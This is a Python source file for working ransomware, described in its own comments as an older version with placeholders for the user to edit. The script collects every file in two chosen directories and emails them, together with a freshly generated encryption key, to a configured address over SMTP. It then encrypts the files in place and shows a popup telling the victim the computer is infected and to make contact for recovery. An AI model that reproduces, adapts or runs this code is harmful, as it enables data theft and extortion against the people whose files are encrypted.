# THIS IS AN OLDER VERSION PLEASE USE THE V1.0.0 RELEASE

from cryptography.fernet import Fernet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import os
import tkinter as tk
from tkinter import messagebox

# Generate a new key
key = Fernet.generate_key()
key_key_path = 'key.key'

# Save the key to a .key file (binary format)
with open(key_key_path, 'wb') as key_key_file:
    key_key_file.write(key)

# Email settings
def send_email_with_backup(files, key_file_path, subject, body, to_email, from_email, smtp_server, smtp_port, smtp_user, smtp_password):
    """Send an email with the files and encryption key attached."""
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    
    msg.attach(MIMEText(body, 'plain'))

    # Attach each file
    for file_path in files:
        part = MIMEBase('application', 'octet-stream')
        with open(file_path, 'rb') as file:
            part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
        msg.attach(part)
    
    # Attach the encryption key (binary format)
    key_part = MIMEBase('application', 'octet-stream')
    with open(key_file_path, 'rb') as key_file:
        key_part.set_payload(key_file.read())
    encoders.encode_base64(key_part)
    key_part.add_header('Content-Disposition', 'attachment; filename=key.key')
    msg.attach(key_part)

    # Send the email
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(smtp_user, smtp_password)
            server.send_message(msg)
            print("Email sent successfully!")
    except smtplib.SMTPAuthenticationError as e:
        print(f"SMTP Authentication Error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Encrypt files in a directory
def encrypt_file(file_path, cipher_suite):
    """Encrypt a single file."""
    with open(file_path, 'rb') as file:
        file_data = file.read()
    
    encrypted_data = cipher_suite.encrypt(file_data)
    
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def encrypt_directory(directory_path, cipher_suite):
    """Encrypt all files in a directory."""
    for root, _, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path, cipher_suite)

# Set the paths to encrypt
directory1 = 'C:\\path\\to\\files\\to\\be\\ciphered'  # Customize this path
directory2 = 'C:\\do\\the\\same\\here'  # Customize this path

# Email and SMTP settings for your email provider
subject = "PYTHON CODE FILES POOPETHEEEEEE"
body = "Here are the files and below are the files that are backed up."

# EDIT THIS PART!!!!!!

to_email = "send files and key to here@example.com"
from_email = "Insertsender@example.com"  # Use this email as the sender
smtp_server = "smtp.mail.me.com" # icloud smtp server
smtp_port = 587
smtp_user = "Insertsender@example.com"
smtp_password = "password"  # Use password for sender account

# STOP EDITING HERE!!!!!!!!

# Send the backup email
files_to_send = [os.path.join(root, file_name) for directory in [directory1, directory2] for root, _, files in os.walk(directory) for file_name in files]
send_email_with_backup(files_to_send, key_key_path, subject, body, to_email, from_email, smtp_server, smtp_port, smtp_user, smtp_password)

# Create the cipher suite
cipher_suite = Fernet(key)

# Encrypt the directories
for directory in [directory1, directory2]:
    encrypt_directory(directory, cipher_suite)

# Display a popup message
def show_popup():
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Notification", "Your computer is now infected with poopedethdeeeeeeee. Your filenameorpath files are encrypted and replaced. Contact emailhere for recovery instructions.")
                                                                                                     # EDIT ABOVE!!
show_popup()

# You would then use the key.key file and the decipher.py app to return the files back to normal. 
